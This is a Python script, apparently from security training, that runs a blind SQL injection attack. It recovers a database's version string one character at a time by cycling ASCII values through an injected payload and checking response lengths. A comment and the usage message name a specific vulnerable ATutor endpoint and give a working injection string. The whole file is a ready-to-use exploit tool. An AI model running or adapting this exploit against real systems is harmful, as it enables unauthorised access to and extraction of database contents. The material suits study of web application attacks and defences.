import sys
import re
import requests

class colorterm:
    ENDC = '\033[0m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

def response(headers, content):
    print("Response Headers:")
    print(headers, '\n')
    print("Response Content:")
    print(colorterm.GREEN + content, '\n' + colorterm.ENDC)

def search_blind_sqli(ip, uri, inj_str):
    for i in range(32, 126):
        repl    = inj_str.replace("[CHAR]", str(i))
        target  = uri %(ip, repl)
        r       = requests.get(target)
        
        content_length = int(r.headers['Content-Length'])

        if (content_length > 20):
            return i

    return None

def db_version(ip, uri, injected_string):
    print("(+) Retrieving database version...")

    for i in range(1, 20):
        injection_string = injected_string % i
        extracted_char = chr(search_blind_sqli(ip, uri, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()

    print(colorterm.WARNING + "(+) You've found something interesting!" + colorterm.ENDC)    
    print("\n(+) done!\n")

def main():
    if len(sys.argv) != 4:
        print(f"(+) usage: {sys.argv[0]} <target> <uri> <injection_string>")
# "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" 192.168.150.103 "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23"
        print(f"(+) eg: {sys.argv[0]} \"test/q?=\" \"aaa\'\"[CHAR]\"")
        print(colorterm.FAIL + "(+) Payload must contain [CHAR] ex: \"test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23\"\n" + colorterm.ENDC)
        sys.exit(-1)

    ip, uri, injection_string = sys.argv[1], sys.argv[2], sys.argv[3]

    db_version(ip, uri, injection_string)


if __name__ == "__main__":
    main()
